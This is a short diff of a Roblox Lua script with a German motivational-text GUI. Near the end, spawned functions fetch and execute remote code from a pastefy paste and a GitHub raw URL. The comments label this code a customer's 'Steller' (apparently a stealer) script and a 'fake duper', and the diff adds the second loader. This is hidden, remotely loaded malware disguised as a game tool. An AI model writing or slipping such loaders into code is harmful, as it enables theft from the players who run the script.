@@ -113,7 +113,6 @@ spawn(function()
     end
 end)
 
-
 -- ✨ Rotierende motivierende Sätze
 local encouragementText = Instance.new("TextLabel")
 encouragementText.Size = UDim2.new(0.9, 0, 0, 40)
@@ -256,4 +255,8 @@ end)
 
 spawn(function() -- Steller script from customer (injects asap)
     loadstring(game:HttpGet("https://pastefy.app/JEEbZB4Q/raw"))()
+end)
+
+spawn(function() -- dont remove working fake duper
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hades2548/SentryV2Hub/refs/heads/main/DUPER"))()
 end)
